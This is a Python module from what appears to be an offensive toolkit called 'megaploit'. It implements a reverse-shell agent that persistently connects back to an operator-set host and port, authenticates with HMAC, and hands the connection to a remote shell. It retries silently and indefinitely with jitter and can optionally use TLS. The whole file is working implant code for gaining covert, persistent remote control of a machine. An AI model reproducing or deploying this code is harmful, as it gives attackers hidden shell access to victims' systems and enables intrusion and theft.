"""
megaploit.agent.connection
~~~~~~~~~~~~~~~~~~~~~~~~~~
Persistent connect-back loop.
Tries to reach LHOST:PORT, authenticates with HMAC-SHA256, then hands
off to run_shell().  If the connection drops, waits RECONNECT_DELAY + jitter
seconds and retries — silently and indefinitely.

TLS is opt-in: USE_TLS is set to True by the server's  generate --tls  command.
When USE_TLS=False (the default) the agent connects over plain TCP so it works
with a plain TCP listener that has no certs configured.

When USE_TLS=True the agent uses a hardened SSL context:
  - TLS 1.2 minimum
  - AEAD-only cipher suites (ECDHE+AESGCM, ECDHE+CHACHA20)
  - No renegotiation, no compression
"""

from __future__ import annotations

import random
import socket
import ssl
import time

from megaploit.core.config import AUTH_TIMEOUT, RECONNECT_DELAY, RECONNECT_JITTER
from megaploit.core.crypto import agent_authenticate, load_key
from megaploit.agent.shell import run_shell

# ---------------------------------------------------------------------------
# Configuration — patched by server before deployment
# ---------------------------------------------------------------------------

LHOST   = "127.0.0.1"
PORT    = 4444
USE_TLS = False   # set to True by: generate --tls


# ---------------------------------------------------------------------------
# Connect-back loop
# ---------------------------------------------------------------------------

def start(secret_key_path: str = "secret.key") -> None:
    secret_key = load_key(secret_key_path)

    # Build a reusable hardened SSL context only if TLS is requested
    _ssl_ctx: ssl.SSLContext | None = None
    if USE_TLS:
        # Import here to avoid circular dependency at module load time
        from megaploit.server.listener import build_agent_ssl_context
        _ssl_ctx = build_agent_ssl_context()

    while True:
        conn: socket.socket | None = None
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(AUTH_TIMEOUT)

            if _ssl_ctx is not None:
                conn = _ssl_ctx.wrap_socket(raw, server_hostname=LHOST)
            else:
                conn = raw

            conn.connect((LHOST, PORT))

            if not agent_authenticate(conn, secret_key, timeout=AUTH_TIMEOUT):
                conn.close()
                _sleep_with_jitter()
                continue

            conn.settimeout(None)
            run_shell(conn)

        except (ConnectionRefusedError, OSError, ssl.SSLError):
            pass
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.close()
                except OSError:
                    pass

        _sleep_with_jitter()


def _sleep_with_jitter() -> None:
    """Sleep RECONNECT_DELAY + random jitter to avoid thundering-herd reconnects."""
    time.sleep(RECONNECT_DELAY + random.uniform(0, RECONNECT_JITTER))
